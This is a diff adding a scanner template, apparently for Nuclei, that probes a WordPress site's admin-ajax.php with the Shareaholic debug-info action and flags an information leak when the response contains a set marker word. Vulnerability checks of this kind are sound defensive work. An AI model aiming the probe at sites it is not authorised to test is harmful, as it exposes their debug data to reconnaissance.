@@ -1,0 +1,16 @@
+id: poc-yaml-shareaholic-info-leak
+info:
+  name: Shareaholic debug_info.php Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-admin/admin-ajax.php?action=shareaholic_debug_info"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "shareaholic_server_reachable"
+        part: body
